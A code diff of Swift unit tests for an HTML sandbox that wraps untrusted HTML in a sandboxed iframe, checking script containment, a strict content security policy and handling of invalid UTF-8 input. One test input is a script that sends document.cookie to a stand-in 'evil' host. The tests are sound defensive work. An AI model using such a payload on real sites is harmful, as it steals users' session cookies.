@@ -21,8 +21,17 @@ final class HtmlSandboxTests: XCTestCase {
         let out = HtmlSandbox.wrap(#"<script>fetch("https://evil/"+document.cookie)</script>"#)
         // The only script text present must be within the srcdoc attribute value,
         // i.e. after `srcdoc="`, never as a top-level element.
-        let iframeStart = out.range(of: "srcdoc=\"")
-        XCTAssertNotNil(iframeStart)
+        guard let srcdocStart = out.range(of: "srcdoc=\"") else {
+            return XCTFail("no srcdoc attribute")
+        }
+        // Assert the positional invariant: every `<script` occurrence sits AFTER the
+        // start of the srcdoc attribute value — none escaped out to become a sibling.
+        var searchFrom = out.startIndex
+        while let hit = out.range(of: "<script", range: searchFrom..<out.endIndex) {
+            XCTAssertGreaterThan(hit.lowerBound, srcdocStart.lowerBound,
+                "a <script token escaped the srcdoc attribute: \(out)")
+            searchFrom = hit.upperBound
+        }
         // The `"` inside the payload is escaped, so the srcdoc attribute is intact.
         XCTAssertTrue(out.contains("&quot;https://evil/&quot;"), out)
     }
@@ -43,5 +52,27 @@ final class HtmlSandboxTests: XCTestCase {
     func testNulStripped() {
         let out = HtmlSandbox.wrap("<p>a\u{0000}b</p>")
         XCTAssertFalse(out.contains("\u{0000}"), "NUL should be stripped")
+    }
+
+    func testStrictCSPIsPresent() {
+        // srcdoc inherits the embedder CSP; default-src 'none' blocks the passive
+        // img/CSS network beacon that the bare sandbox alone would still permit.
+        let out = HtmlSandbox.wrap("<p>x</p>")
+        XCTAssertTrue(out.contains("Content-Security-Policy"), out)
+        XCTAssertTrue(out.contains("default-src 'none'"), out)
+        XCTAssertFalse(out.contains("script-src"), out)  // no script source is whitelisted
+    }
+
+    func testInvalidUtf8DataIsStillSandboxed() {
+        // A hostile file that is NOT valid UTF-8 (a stray 0xFF before a script) must
+        // still be sandboxed — the data path decodes lossily, never falls through to
+        // an unsandboxed raw write.
+        var bytes: [UInt8] = [0xFF]  // invalid UTF-8 lead byte
+        bytes.append(contentsOf: Array("<script>evil()</script>".utf8))
+        let out = HtmlSandbox.wrap(data: Data(bytes))
+        XCTAssertTrue(out.contains("<iframe sandbox"), out)
+        XCTAssertFalse(out.lowercased().contains("allow-scripts"), out)
+        // The (lossily decoded) script text lives inside the srcdoc attribute value.
+        XCTAssertTrue(out.contains("srcdoc=\""), out)
     }
 }
